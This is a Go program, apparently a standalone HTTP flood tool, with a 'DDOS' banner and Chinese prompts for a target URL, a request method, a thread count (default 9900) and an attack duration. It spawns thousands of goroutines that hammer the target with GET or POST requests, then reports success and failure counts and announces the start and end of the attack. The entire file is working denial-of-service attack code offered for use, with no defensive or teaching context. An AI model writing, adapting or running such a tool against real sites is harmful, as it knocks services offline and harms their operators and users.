package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Cyan   = "\033[36m" // 青色
	Purple = "\033[35m" // 紫色
	Reset  = "\033[0m"  // 重置颜色
)

var (
	successCount int64 // 成功请求计数
	errorCount   int64 // 失败请求计数
)

func banner() {
	fmt.Println(Purple + "DDOS" + Reset)
}

func flood(target string, method string, duration time.Duration, wg *sync.WaitGroup, id int) {
	defer wg.Done()
	client := http.Client{Timeout: 5 * time.Second}
	end := time.Now().Add(duration)

	for time.Now().Before(end) {
		var req *http.Request
		var err error

		if method == "POST" {
			payload := bytes.NewBuffer([]byte("data=DDOS")) // 修改payload
			req, err = http.NewRequest("POST", target, payload)
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			req, err = http.NewRequest("GET", target, nil)
		}

		if err != nil {
			atomic.AddInt64(&errorCount, 1)
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			atomic.AddInt64(&errorCount, 1)
			continue
		}

		resp.Body.Close()
		atomic.AddInt64(&successCount, 1)
	}
}

func animateLoading(message string, duration time.Duration) {
	spin := []string{"|", "/", "-", "\\"}
	fmt.Print(Cyan + message)
	for i := 0; i < int(duration.Seconds()*4); i++ {
		fmt.Printf("\r%s%s %s", Cyan, message, spin[i%4])
		time.Sleep(250 * time.Millisecond)
	}
	fmt.Print("\r" + strings.Repeat(" ", 40) + "\r")
}

func main() {
	banner()

	reader := bufio.NewReader(os.Stdin)

	fmt.Print(Cyan + "目标 URL (例如: http://example.com): " + Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		fmt.Println(Purple + "[!] URL 无效. 必须以 http:// 或 https:// 开头" + Reset)
		return
	}

	fmt.Print(Cyan + "请求方法 (GET/POST) [默认 GET]: " + Reset)
	method, _ := reader.ReadString('\n')
	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = "GET"
	}
	if method != "GET" && method != "POST" {
		fmt.Println(Purple + "[!] 只支持 GET 或 POST." + Reset)
		return
	}

	fmt.Print(Cyan + "线程数 [默认 9900]: " + Reset)
	threadStr, _ := reader.ReadString('\n')
	threadStr = strings.TrimSpace(threadStr)
	threads := 9900
	if threadStr != "" {
		t, err := strconv.Atoi(threadStr)
		if err == nil && t > 0 {
			threads = t
		}
	}

	fmt.Print(Cyan + "攻击持续时间 (秒) [默认 30]: " + Reset)
	durStr, _ := reader.ReadString('\n')
	durStr = strings.TrimSpace(durStr)
	duration := 30 * time.Second
	if durStr != "" {
		d, err := strconv.Atoi(durStr)
		if err == nil && d > 0 {
			duration = time.Duration(d) * time.Second
		}
	}

	animateLoading("正在准备攻击", 2)

	fmt.Println(Purple + "\n[✓] 开始攻击..." + Reset)
	start := time.Now()

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go flood(target, method, duration, &wg, i+1)
	}

	wg.Wait()
	totalTime := time.Since(start)

	fmt.Println(Purple + "\n[✓] 攻击结束!" + Reset)
	fmt.Printf("%s总成功数: %d\n", Cyan, successCount)
	fmt.Printf("总失败数   : %d\n", errorCount)
	fmt.Printf("总持续时间  : %s%s\n", totalTime.Round(time.Second), Reset)
}
